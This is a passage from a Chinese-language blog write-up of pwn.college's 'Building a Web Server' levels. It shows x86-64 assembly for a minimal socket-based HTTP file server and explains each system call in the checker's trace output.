class="line"># bind a socket</span><br><span class="line">    push 0x0</span><br><span class="line">    push 0x0000000050000002</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen a socket</span><br><span class="line">    mov rsi, 0  # 这里没有设置rdi，因为该参数与上一个rdi相同</span><br><span class="line">    mov rax, 50 # listen</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br></pre></td></tr></tbody></table></figure></li><li><p>level5：接受连接。</p><p>wp：根据提示<code>accept(3, NULL, NULL)</code>，将后两个参数设置为0。将后两个参数设为null，服务器接受客户端连接时不会存储客户端的地址信息</p><blockquote><p><code>bind</code> 函数中的 <code>&amp;address</code>用于指定服务器的地址信息（IP 和端口），以绑定套接字。</p><p><code>accept</code> 函数中的 <code>&amp;address</code>用于接收客户端的地址信息（IP和端口），以识别哪个客户端连接到了服务器。</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># bind a socket</span><br><span class="line">    push 0x0</span><br><span class="line">    push 0x0000000050000002</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen a socket</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept a connection</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br></pre></td></tr></tbody></table></figure></li><li><p>level6：静态响应HTTP请求</p><p>wp：根据下面的提示完善程序</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ ] accept(<span class="number">3</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>) = <span class="number">4</span></span><br><span class="line">[ ] read(<span class="number">4</span>, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">[ ] write(<span class="number">4</span>, <span class="string">"HTTP/1.0 200 OK\r\n\r\n"</span>, <span class="number">19</span>) = <span class="number">19</span></span><br><span class="line">[ ] close(<span class="number">4</span>) = <span class="number">0</span></span><br></pre></td></tr></tbody></table></figure><p>这里主要涉及到汇编代码的编写，其中注意 <code>lea</code>的用法，可获取变量的地址。这里 <code>read</code>的作用是尝试从某个文件描述符（由 <code>accept</code>系统调用返回的套接字描述符<code>rax</code>）读取数据，并将读取的数据存储到 <code>array</code>缓冲区中。通常情况下，这个操作用于读取客户端通过网络发送给服务器的数据。下面只展示重要的代码：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># read</span><br><span class="line">    push rax  # 将 accept 的返回值存放栈中</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, array</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    lea rsi, hello</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    pop rdi  # 获取 accept 返回值</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .fill 256, 1, 0  # 分配 256 字节并初始化为 0</span><br><span class="line">    hello:</span><br><span class="line">        .ascii "HTTP/1.0 200 OK\r\n\r\n" # 用于定义一个不以零字节结尾的字符串</span><br><span class="line">server.s                                                        </span><br></pre></td></tr></tbody></table></figure></li><li><p>level7：动态响应HTTP请求，要求如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[ ] accept(<span class="number">3</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>) = <span class="number">4</span></span><br><span class="line">  [ ] read(<span class="number">4</span>, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">  [ ] open(<span class="string">"&lt;open_path&gt;"</span>, O_RDONLY) = <span class="number">5</span></span><br><span class="line">  [ ] read(<span class="number">5</span>, &lt;read_file&gt;, &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">  [ ] close(<span class="number">5</span>) = <span class="number">0</span></span><br><span class="line">  [ ] write(<span class="number">4</span>, <span class="string">"HTTP/1.0 200 OK\r\n\r\n"</span>, <span class="number">19</span>) = <span class="number">19</span></span><br><span class="line">  [ ] write(<span class="number">4</span>, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">  [ ] close(<span class="number">4</span>) = <span class="number">0</span></span><br></pre></td></tr></tbody></table></figure><p>wp：<code>open</code>函数需要文件名，这里应该是从客户端发送的数据中获取，包含在<code>read</code>读到缓冲区的内容中，下面是<code>int open(const char *filename, int flag)</code>中<code>flag</code>的具体整数值</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> O_RDONLY00000000  <span class="comment">// 注意这里是8进制</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> O_WRONLY00000001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> O_RDWR00000002</span></span><br></pre></td></tr></tbody></table></figure><p>这题的难点在于如何获取文件路径，根据GET请求得知，文件路径从第四个字节开始，且该题的文件路径长度为16。下面是完整代码</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"># read</span><br><span class="line">    push rax  # 将 accept 的返回值存放栈中</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, array</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># open</span><br><span class="line">    lea rdi, [array+4] # 获取文件路径字符串的起始地址</span><br><span class="line">    movb [rdi+16], 0   # 文件路径长度为16，需要截断</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, 512</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">mov length, rax # 获取文件读取的长度，read的返回值就是文件内容大小</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    pop rdi  # 获取 open 返回值</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    pop rdi  # 获取accept返回值</span><br><span class="line">    lea rsi, hello</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, length</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .fill 256, 1, 0  # 分配 256 字节并初始化为 0</span><br><span class="line">    hello:</span><br><span class="line">        .ascii "HTTP/1.0 200 OK\r\n\r\n" # 用于定义一个不以零字节结尾的字符串</span><br><span class="line">    buf:</span><br><span class="line">        .fill 512, 1, 0  # 存放打开文件的内容</span><br><span class="line">    length: # 用于存放数据长度</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br></pre></td></tr></tbody></table></figure><p>运行上述代码得到flag，并得到相关回显：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[✓] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[✓] bind(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("0.0.0.0")}, 16) = 0</span><br><span class="line">[✓] listen(3, 0)                            = 0</span><br><span class="line">[✓] accept(3, NULL, NULL)                   = 4</span><br><span class="line">[✓] read(4, "GET /tmp/tmpis83a2pt HTTP/1.1\r\nHost: localhost\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate, zstd\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n", 256) = 161</span><br><span class="line">[✓] open("/tmp/tmpis83a2pt", O_RDONLY)      = 5</span><br><span class="line">[✓] read(5, "7osMxKlRRIEiB5RFFE59QSGIQseFVGBP8cIGvhX7PjDDrDq2HolYLBQRefm2Qsvlzql9SsngtKY7Hqlm0TAT1FwASgn9Ja998SIuixOC5KXxCBCinbJdZ1IG5uzds8PdTagB4jNtlIE0k4RQ", 512) = 144</span><br><span class="line">[✓] close(5)                                = 0</span><br><span class="line">[✓] write(4, "HTTP/1.0 200 OK\r\n\r\n", 19) = 19</span><br><span class="line">[✓] write(4, "7osMxKlRRIEiB5RFFE59QSGIQseFVGBP8cIGvhX7PjDDrDq2HolYLBQRefm2Qsvlzql9SsngtKY7Hqlm0TAT1FwASgn9Ja998SIuixOC5KXxCBCinbJdZ1IG5uzds8PdTagB4jNtlIE0k4RQ", 144) = 144</span><br><span class="line">[✓] close(4)                                = 0</span><br><span class="line">[✓] exit(0)           </span><br></pre></td></tr></tbody></table></figure><p>下面是对这个流程的详细解释：</p><ol type="1"><li><strong>创建套接字</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br></pre></td></tr></tbody></table></figure><ul><li>创建一个用于 IPv4（AF_INET）和TCP（SOCK_STREAM）的套接字。<code>socket()</code> 返回的文件描述符为<code>3</code>。</li></ul></li><li><strong>绑定套接字</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] bind(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("0.0.0.0")}, 16) = 0</span><br></pre></td></tr></tbody></table></figure><ul><li>将套接字绑定到本地地址 <code>0.0.0.0</code> 和端口<code>80</code>，使其能够接收来自任何 IP 地址的连接。</li></ul></li><li><strong>监听连接</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] listen(3, 0) = 0</span><br></pre></td></tr></tbody></table></figure><ul><li>使套接字开始监听传入的连接。这里的 <code>backlog</code> 参数为<code>0</code>，可能意味着默认的待处理连接队列长度。</li></ul></li><li><strong>接受连接</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] accept(3, NULL, NULL) = 4</span><br></pre></td></tr></tbody></table></figure><ul><li>接受一个传入的连接。新的套接字文件描述符为<code>4</code>，用于与客户端进行通信。</li></ul></li><li><strong>读取客户端请求</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] read(4, "GET /tmp/tmpis83a2pt HTTP/1.1\r\nHost: localhost\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate, zstd\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n", 256) = 161</span><br></pre></td></tr></tbody></table></figure><ul><li>从客户端套接字 <code>4</code> 读取 HTTP 请求，读取的请求长度为<code>161</code> 字节。</li></ul></li><li><strong>打开请求的文件</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] open("/tmp/tmpis83a2pt", O_RDONLY) = 5</span><br></pre></td></tr></tbody></table></figure><ul><li>根据客户端的请求路径<code>/tmp/tmpis83a2pt</code>，打开对应的文件，文件描述符为<code>5</code>。</li></ul></li><li><strong>读取文件内容</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] read(5, "7osMxKlRRIEiB5RFFE59QSGIQseFVGBP8cIGvhX7PjDDrDq2HolYLBQRefm2Qsvlzql9SsngtKY7Hqlm0TAT1FwASgn9Ja998SIuixOC5KXxCBCinbJdZ1IG5uzds8PdTagB4jNtlIE0k4RQ", 512) = 144</span><br></pre></td></tr></tbody></table></figure><ul><li>从文件描述符 <code>5</code> 中读取 <code>144</code>字节的数据。</li></ul></li><li><strong>关闭文件</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] close(5) = 0</span><br></pre></td></tr></tbody></table></figure><ul><li>关闭文件描述符 <code>5</code>。</li></ul></li><li><strong>发送响应头</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] write(4, "HTTP/1.0 200 OK\r\n\r\n", 19) = 19</span><br></pre></td></tr></tbody></table></figure><ul><li>向客户端发送 HTTP 响应头，表明请求成功（200 OK），总共发送了<code>19</code> 字节。</li></ul></li><li><strong>发送文件内容</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] write(4, "7osMxKlRRIEiB5RFFE59QSGIQseFVGBP8cIGvhX7PjDDrDq2HolYLBQRefm2Qsvlzql9SsngtKY7Hqlm0TAT1FwASgn9Ja998SIuixOC5KXxCBCinbJdZ1IG5uzds8PdTagB4jNtlIE0k4RQ", 144) = 144</span><br></pre></td></tr></tbody></table></figure><ul><li>将读取到的 <code>144</code> 字节的文件内容写入客户端套接字<code>4</code>。</li></ul></li><li><strong>关闭客户端连接</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] close(4) = 0</span><br></pre></td></tr></tbody></table></figure><ul><li>关闭客户端套接字 <code>4</code>。</li></ul></li><li><strong>退出程序</strong>: <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[✓] exit(0)</span><br></pre></td></tr></tbody></table></figure><ul><li>退出服务器程序，状态码为 <code>0</code> 表示正常退出。</li></ul></li></ol></li><li><p>level8：动态响应多个HTTP请求</p><p>wp：没什么头绪，以为要使用<code>fork</code>函数，但是参考网上的<a href="https://tech.c01dkit.com/pwn-college-cse365-spring2023/#building-a-web-server-writeups">wp</a>，直接在<code>exit</code>前再加个<code>accept</code>函数即可</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"># creat a socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41  # socket</span><br><span class="line">    syscall</span><br><span class="line">    mov sock_f, rax  # 为了第二个accept能够调用该套接字</span><br><span class="line"></span><br><span class="line"># bind a socket</span><br><span class="line">    push 0x0</span><br><span class="line">    push 0x0000000050000002</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49  # bind</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># listen a socket</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept a connection</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    push rax  # 将 accept 的返回值存放栈中</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, array</span><br><span class="line">    mov rdx, 256</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># open</span><br><span class="line">    lea rdi, [array+4] # 获取文件路径字符串的起始地址</span><br><span class="line">    movb [rdi+16], 0   # 文件路径长度为16，需要截断</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># read</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, 512</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">mov length, rax # 获取文件读取的长度</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    pop rdi  # 获取 open 返回值</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    pop rdi  # 获取accept返回值</span><br><span class="line">    lea rsi, hello</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># write</span><br><span class="line">    lea rsi, buf</span><br><span class="line">    mov rdx, length</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># close</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># accept</span><br><span class="line">    mov rdi, sock_f</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"># exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60  # SYS_exit</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .fill 256, 1, 0  # 分配 256 字节并初始化为 0</span><br><span class="line">    hello:</span><br><span class="line">        .ascii "HTTP/1.0 200 OK\r\n\r\n" # 用于定义一个不以零字节结尾的字符串</span><br><span class="line">    buf:</span><br><span class="line">        .fill 512, 1, 0  # 存放打开文件的内容</span><br><span class="line">    length:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br><span class="line">    sock_f:</span><br><span class="line">        .quad 0 # 定义一个 8 字节变量并初始化为 0</span><br></pre></td></tr></tbody></table></figure></li><li><p>level9：多个程序动态响应多个HTTP请求（GET）。题目要求分为父进程和子进程</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">===== Expected: Parent Process =====</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, {sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr("&lt;bind_address&gt;")}, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] listen(3, 0) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = 4</span><br><span class="line">[ ] fork() = &lt;fork_result&gt;</span><br><span class="line">[ ] close(4) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = ?</span><br><span class="line"></span><br><span class="line">===== Expected: Child Process =====</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">[ ] open("&lt;open_path&gt;", O_RDONLY) = 3</span><br><span class="line">[ ] read(3, &lt;read_file&gt;, &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] write(4, "HTTP/1.0 200 OK\r\n\r\n", 19) = 19</span><br><span class="line">[ ] write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></tbody></table></figure><p>wp：通过<code>fork</code>函数的返回值判断是父进程还是子进程</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span 